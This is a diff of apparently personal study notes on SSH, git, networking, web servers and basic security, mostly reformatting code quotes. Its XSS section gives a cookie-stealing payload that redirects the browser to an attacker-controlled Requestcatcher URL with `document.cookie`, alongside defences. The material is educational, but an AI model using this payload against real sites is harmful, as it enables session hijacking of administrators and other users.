@@ -1665,29 +1665,29 @@ Use `deactivate` to exit the venv
 
 ### SSH usage
 
-- ``ssh -i "~/.ssh/privatekey_filename" user@[IPv4 or IPv6 address, or domain name]``
-- ``ssh -i "~/.ssh/privatekey" user@hostname -J -i "~/.ssh/privatekey" user@ssh-bridge``
+- `ssh -i "~/.ssh/privatekey_filename" user@[IPv4 or IPv6 address, or domain name]`
+- `ssh -i "~/.ssh/privatekey" user@hostname -J -i "~/.ssh/privatekey" user@ssh-bridge`
 ( u)
 - Note : if something doesn't work, check that you have specified a private key (and that it's the right one)
 - When using an SSH bridge, both what is sent by you to the ssh bridge _and_ what is sent by the ssh bridge to the desired distant host are encrypted with your private key. Actually, the private keys can be configured to be different (just set different keys in the command), but the ssh bridge will not use any key located on their storage. You must specify (and give) both keys.
 - The **authorized_keys** file : 
-  * It is located in ``~/.ssh/``, on the appropriate user (there is one per user, it will correspond to the user you connect to when you use ``user@host``)
+  * It is located in `~/.ssh/`, on the appropriate user (there is one per user, it will correspond to the user you connect to when you use ``user@host``)
   * It lists all public keys that are allowed to connect to the server (to the host (machine) and user concerned).
   * You typically have to contact the server administrator for him to add your public key in this file for you to be able to connect.
 - The **known_host** file : 
-  * It is located in ``~/.ssh/``, but (typically) on _your_ machine.
+  * It is located in `~/.ssh/`, but (typically) on _your_ machine.
   * It lists _public-key_-_ip address_ pairs, to avoid man-in-the-middle attacks (in the form of hashs computed using the SHA256 (or another) hash map)
   * When a machine connects to an IP address for the first time, the terminal (OpenSSH) tells something like : "Are you sure you want to connect to this host ? Here is (a hash of) the remote host's public key". The idea is that you should then contact the server administrator to make sure this fingerprint is actually the one of the server you want to connect to : to avoid a man-in-the-middle attack, i.e. to avoid connecting to the wrong remote host. 
   * In practice, no one does that. We just type "yes". 
-  * The _public-key_-_ip address_ pair (a hash of it, actually) is then stored in the ``known_host`` file. (It adds one line to the file, the fact that they are paired is made by the fact that they are on the same line). 
+  * The _public-key_-_ip address_ pair (a hash of it, actually) is then stored in the `known_host` file. (It adds one line to the file, the fact that they are paired is made by the fact that they are on the same line). 
   * Your machine then knows that this remote host is trustworthy and it won't ask this a second time.
 
 ### SSH Config files
 
 - An SSH config allow to win time by pre-configuring some SSH parameter to connect to distant servers quicker without having to write the same command over and over again.
 - An SSH config must be written in a (text) file, either :
-  * named ``config`` and located in ``~/.ssh/``
-  * or named ``ssh_config`` and located in ``/etc/ssh/ssh_config`` (on Linux)
+  * named `config` and located in `~/.ssh/`
+  * or named `ssh_config` and located in `/etc/ssh/ssh_config` (on Linux)
 - Example :
 ```
 Host ssh.enst.fr
@@ -1713,18 +1713,18 @@ Host pace
   IdentityFile ~/.ssh/ed
 ```
 - Uppercase first letters are mandatory.
-- ``Hostname``, ``User``, ``IdentityFile`` are self-explanatory...
-- ``ProxyCommand`` specifies the command to use to connect to the server. (...)
+- `Hostname`, `User`, `IdentityFile` are self-explanatory...
+- `ProxyCommand` specifies the command to use to connect to the server. (...)
   * The command string extends to the end of the line, and is executed using the user's shell ‘exec’ directive to avoid a lingering shell process. (...)
-  * ``ProxyCommand ssh -W %h:%p ssh.enst.fr`` can be used to automate the connection to a SSH bridge. (What does -W do though ?)(...)
+  * `ProxyCommand ssh -W %h:%p ssh.enst.fr` can be used to automate the connection to a SSH bridge. (What does -W do though ?)(...)
 - ProxyJump too, but easier. 
-  * ``ProxyJump user@host:port``
-- ``ProxyCommand`` and ``ProxyJump`` accept [TOKENS](https://man.openbsd.org/ssh_config#TOKENS) :
-  * ``%h`` : will be replaced by the Host
-  * ``%n`` : will be replaced by the original remote hostname, as given on the command line.
-  * ``%p`` : will be replaced by the remote Port.
-  * ``%r`` : will be replaced by the remote Username.
-  * ``%%`` : will be replaced by ``%``
+  * `ProxyJump user@host:port`
+- `ProxyCommand` and `ProxyJump` accept [TOKENS](https://man.openbsd.org/ssh_config#TOKENS) :
+  * `%h` : will be replaced by the Host
+  * `%n` : will be replaced by the original remote hostname, as given on the command line.
+  * `%p` : will be replaced by the remote Port.
+  * `%r` : will be replaced by the remote Username.
+  * `%%` : will be replaced by `%`
   * ProxyCommand and ProxyJump do not accept any other [TOKENS  described by the Documentation](https://man.openbsd.org/ssh_config#TOKENS)
   * There exists other tokens.
 - **Documentation** : 
@@ -1734,36 +1734,36 @@ Host pace
 ### SCP
 
 - Usage : 
-  * ``scp -i "path/to/key" user@[IP Address]`` (Brackets are optional)
-  * ``scp -i "path/to/key" [filename | path/to/filename] user@[IP Address]:desired/path/to/file`` (First brackets are unnecessary (maybe even command-breaking), second brackets are mandatory)(Also, it is possible to change the filename in the process : ``desired/path/to/newfilename.fileextension``. In other words, ``file`` can be different from the original filename (the new file created will then have this name). Specifying no file name (that is, ``desired/path/to/file/``, with the path **ending in a ``/``**) will keep the file name)
-  * **To copy (whole) directories** : ``scp (-i ...) -r foolder/* root@pace-lxc.rezel.net:~/``. The ``*`` wildcard is optional.
+  * `scp -i "path/to/key" user@[IP Address]` (Brackets are optional)
+  * `scp -i "path/to/key" [filename | path/to/filename] user@[IP Address]:desired/path/to/file` (First brackets are unnecessary (maybe even command-breaking), second brackets are mandatory)(Also, it is possible to change the filename in the process : `desired/path/to/newfilename.fileextension`. In other words, `file` can be different from the original filename (the new file created will then have this name). Specifying no file name (that is, `desired/path/to/file/`, with the path **ending in a `/`**) will keep the file name)
+  * **To copy (whole) directories** : `scp (-i ...) -r foolder/* root@pace-lxc.rezel.net:~/`. The `*` wildcard is optional.
 - SHA256 (et SHA512, SHA1, ...) sont des fonctions de hashage.
-- **authorized_keys** : C'est le fichier, situé dans ``~/.ssh/`` d'un serveur, qui dit les clés publiques qui sont autorisées à se connecter à un certain user. 
-  * Un client peut se connecter à un serveur en SSH au user ``utilisateur`` si (et seulement si) sa clé publique se situe dans le ``authorized_keys`` de l'utilisateur, autrement dit dans le fichier ``/home/utilisateur/.ssh/authorized_keys``. 
+- **authorized_keys** : C'est le fichier, situé dans `~/.ssh/` d'un serveur, qui dit les clés publiques qui sont autorisées à se connecter à un certain user. 
+  * Un client peut se connecter à un serveur en SSH au user `utilisateur` si (et seulement si) sa clé publique se situe dans le `authorized_keys` de l'utilisateur, autrement dit dans le fichier `/home/utilisateur/.ssh/authorized_keys`. 
 
 ## Cybersecurity
 
 ### Metadatas
 
-- ``meta2go``, ``exiftool``, ``aperisolve``, ... Are tools that are able to extract metadatas.
-- ``www.dcode.fr`` propose un détecteur de code, qui tente de trouver le code qui a choffré un truc. 
+- `meta2go`, `exiftool`, `aperisolve`, ... Are tools that are able to extract metadatas.
+- `www.dcode.fr` propose un détecteur de code, qui tente de trouver le code qui a choffré un truc. 
 
 ### Cross-site scripting (XSS)
 
 - XSS Means cross-site scripting. Yes, the acronym does not work...
 - The goal of a XSS breach is to get the cookies of an administrator of a web page. This is done by getting a cookie, which acts like an access token.
-- Example : When typing "Foobar" in a the Google seach engine, the word "Foobar" appears in the web page source code. More generally : if there is an input on the page that reads text, and if it turns out that this code gets written directly on the HTML, you can inject stuff on the HTML... JavaScript ``<script></script>`` tags for instance, that can run code !
+- Example : When typing "Foobar" in a the Google seach engine, the word "Foobar" appears in the web page source code. More generally : if there is an input on the page that reads text, and if it turns out that this code gets written directly on the HTML, you can inject stuff on the HTML... JavaScript `<script></script>` tags for instance, that can run code !
 - Context is the crucial point : The text could be inserted as raw HTML code, inside HTML tags attribute, or inside JavaScript code.
 - To detect XSS : List all user inputs, and try to see them being reused (reflected, written directly) on the page 
 - To exploit an XSS breach : 
-  * You would, typically, insert the following JavaScript Code : ``document.location.replace(CONTROLLED_URL+document.cookie)``
-  * This code will, when executed in a browser, replace the cuurent URL the browser is into by the URL ``CONTROLLED_URL+document.cookie``.
-  * Here, ``CONTROLLED_URL`` is an URL you control, i.e. that you can choose.
-  * Typically, you would use a website like ``Pipedream`` or **``Requestcatcher``** (Requestcatcher is better) that gives you an URL (which you (partially) choose, like ``hiimsteve.requestcatcher.com`` and prints you the requests that are sent to that URL. 
-  * Adding ``document.cookie`` adds the cookies of the person that get trapped in the XSS breach !
+  * You would, typically, insert the following JavaScript Code : `document.location.replace(CONTROLLED_URL+document.cookie)`
+  * This code will, when executed in a browser, replace the cuurent URL the browser is into by the URL `CONTROLLED_URL+document.cookie`.
+  * Here, `CONTROLLED_URL` is an URL you control, i.e. that you can choose.
+  * Typically, you would use a website like `Pipedream` or **`Requestcatcher`** (Requestcatcher is better) that gives you an URL (which you (partially) choose, like `hiimsteve.requestcatcher.com` and prints you the requests that are sent to that URL. 
+  * Adding `document.cookie` adds the cookies of the person that get trapped in the XSS breach !
 - Reflected XSS
   * In this case, the malicious code is executed locally on the admin's machine.
-  * The attacker sends to the admin a webpage with a malicous payload. Typically, what we mean by payload is URL of the form ``www.website.com/.../[URL encoded payload]`` : that is, adding a payload means adding something to the URL. 
+  * The attacker sends to the admin a webpage with a malicous payload. Typically, what we mean by payload is URL of the form `www.website.com/.../[URL encoded payload]` : that is, adding a payload means adding something to the URL. 
   * The admin must then click on the link. This is basically fishing : the admin must click on the link...
   * The admin will then visit (his own !) web page, connected with his account. His (own !) server will respond ot him (with his admin cookie).
   * The malicious payload will then be executed (on his own machine), and will send his cookie to the attacker.
@@ -1780,12 +1780,12 @@ Host pace
   * Searching a little bit often gets you what you need
 - Protection against XSS
   * The most powerful one : Encoding data
-  * That is, replacing ``<`` by ``&lt;`` and ``>`` by ``&gt;``. This works well because data ecryption in HTML was done precisely to prevent XSS vulnerabilities.
-  * Filtering data : If a user writes ``<script>`` in a text form... He is likely fouting himself of your gueule : prevent them from writing stuff like this in text boxes
+  * That is, replacing `<` by `&lt;` and `>` by `&gt;`. This works well because data ecryption in HTML was done precisely to prevent XSS vulnerabilities.
+  * Filtering data : If a user writes `<script>` in a text form... He is likely fouting himself of your gueule : prevent them from writing stuff like this in text boxes
   * Validation : A text box that is supposed to recieve a phone number should stop anyone from writing anything else than digits for instance ;
   * CSP : complicated, we'll see that later
-- To put payload into URLs, you must use URL encoding : ``urlencoder.org``. This can also be used for URL decoding. More generally, to inject text into URLs, you must encode things into the right "URL format". Otherwise things dont work. 
-- The ``eval()`` function in JavaScript is very dangerous in terms of security. Avoid it (voire : banish it).
+- To put payload into URLs, you must use URL encoding : `urlencoder.org`. This can also be used for URL decoding. More generally, to inject text into URLs, you must encode things into the right "URL format". Otherwise things dont work. 
+- The `eval()` function in JavaScript is very dangerous in terms of security. Avoid it (voire : banish it).
 
 ### Cryptography
 
@@ -1874,9 +1874,9 @@ It works with a function : $ s : (\mathrm{key},\mathrm{message}) \to s(\mathrm{k
 If you have the code source of a compiled binary file, it is easy to understand what the code is used to. 
 
 Reminder : Compilation chain
-- Compiler (gcc, g++) : ``.c``, ``.cpp``, ``.h`` -> ``.s``
-- Assembler (as) : ``.s`` -> ``.o``
-- Linker (ld) ``.o`` -> ``.exe``
+- Compiler (gcc, g++) : `.c`, `.cpp`, `.h` -> `.s`
+- Assembler (as) : `.s` -> `.o`
+- Linker (ld) `.o` -> `.exe`
 - CISC Architectires : (x86/Intel, AMD)
 - RISC Architectures : (ARM, MIPS, RISC-V)
 To train reversing : Crackme challenges.
@@ -1884,8 +1884,8 @@ It is easier on Linux to have these : VirtualBox
 - Static approach : using a decompiler (Ghidra,Cutter) to reverse machine code into [source code](...)
 - Dynamic : Run the binary with debugger ([gdb](https://www.sourceware.org/gdb/), GNU Project Debugger) to inspect memory, registers and the execusion of the code
 - Always start with a static approach
-  * Use ``file`` on an executable file to get th
-  * Use ``strings`` to display all strings located in the executable file. If there is a password hidden it, it can be
+  * Use `file` on an executable file to get th
+  * Use `strings` to display all strings located in the executable file. If there is a password hidden it, it can be
   * Note : in reality 
   * Use Ghidra to try to (statically) un
 - If the static approach isn't enough, you can use gdb
@@ -2040,18 +2040,18 @@ The act of rebasing means taking a bunch of commits, and _re-basing_ them, i.e.,
 
 ### Git miscellaneous information
 
-- ``Your configuration specifies to merge with the ref 'refs/heads/dev-prod' from the remote, 
-``but no such ref was fetched.`` happens when you try to pull from a branch that doesn't exist. 
+- `Your configuration specifies to merge with the ref 'refs/heads/dev-prod' from the remote, 
+`but no such ref was fetched.` happens when you try to pull from a branch that doesn't exist. 
 - Git credentials : 
   * When using Github, Gitlab or Gitea : if you try to push using HTTP, it should likely ask for your Git(Hub/Lab/Tea) credentials.
-  * If you don't have any credientials (on ``git.rezel.net`` or ``gitlab.telecom-paris.fr`` for instance : connecting using SSO), you can generate acces tokens from the Settings panel. Then connect using your username (git.[...]/username/repo)
+  * If you don't have any credientials (on `git.rezel.net` or `gitlab.telecom-paris.fr` for instance : connecting using SSO), you can generate acces tokens from the Settings panel. Then connect using your username (git.[...]/username/repo)
 - When git is installed on a given machine, it must have set up a username and a email (that will correspond to the user that'll use Git in this machine). 
-  * Set up the email with ``git config --global user.email "email@domain.com"``
-  * Set up the username with ``git config --global user.name "username"``
-  * When this is set up, appear as done by you : ``Author: William Driot <william.driot@gmail.com>``
+  * Set up the email with `git config --global user.email "email@domain.com"`
+  * Set up the username with `git config --global user.name "username"`
+  * When this is set up, appear as done by you : `Author: William Driot <william.driot@gmail.com>`
   * **You can set up a username and email for a repo only**
     + This is useful for specific projects
-    + Just remove the ``--global`` flag (and execute the commands in the right repo) : ``git config user.email "email@domain.com"``, ``git config user.name "username"``
+    + Just remove the `--global` flag (and execute the commands in the right repo) : `git config user.email "email@domain.com"`, `git config user.name "username"`
 
 ## Computer 
 
@@ -2087,7 +2087,7 @@ What "is a code point" ? (...)
 
 ANSI ?
 
-Exercise : Find the characters that break the ``EditSummary`` script (they are it the ``Editsummary`` file)
+Exercise : Find the characters that break the `EditSummary` script (they are it the `Editsummary` file)
 
 #### Building a server
 
@@ -2195,10 +2195,10 @@ Switches
 ### Layer 3 networking
 
 Routers
-- ``ip route add [mask : IP range / or : "default" for setting default gateway] via [nexthop]``
+- `ip route add [mask : IP range / or : "default" for setting default gateway] via [nexthop]`
 - One MAC per interface.
 - Never use DHCP for routers !
-- ``ip link set dev [interace] up`` to up an interface
+- `ip link set dev [interace] up` to up an interface
 
 ### Layer 6 networking
 
@@ -2268,7 +2268,7 @@ NATs exist because of the Bozos at Bell labs who decided there would be only 2^3
 
 Note : this actually applies to any device 
 
-- ``ip route add default via [IP]``
+- `ip route add default via [IP]`
 
 #### Physical routers
 
@@ -2296,8 +2296,10 @@ Wireguard is what Clément uses for his private use of VPN. :O
 
 #### Nginx
 
-GitHub stars : 25k
-NGINX is the world's most popular Web Server. It provides load balancing, reverse proxy, ...
+- GitHub stars : 25k
+- Nginx is the world's most popular Web Server. It provides load balancing, reverse proxy, ...
+- Note : nginx does not have sufficient permissions to deal with files (in particular, to serve, redirect to..) stored under `/root/`...!
+- In particular; do not put your web-server there !
 
 #### Caddy
 
@@ -2353,6 +2355,8 @@ sudo apt install caddy
   * By adding `file_server browse`, caddy will display an interface allowing to browse files and folder in that folder.
   * Note : `root * ...` can be simplified as `root ...`
   * `log { ... }` and `{ debug }` do what we expect from them, that is, being verbose about problems and errors. (This will be seen in `systemctl status <service>` if caddy is run as a service)
+- Note : caddy does not have sufficient permissions to deal with files (in particular, to serve, redirect to..) stored under `/root/`...!
+- In particular; do not put your web-server there !
 
 #### Systemctl
 
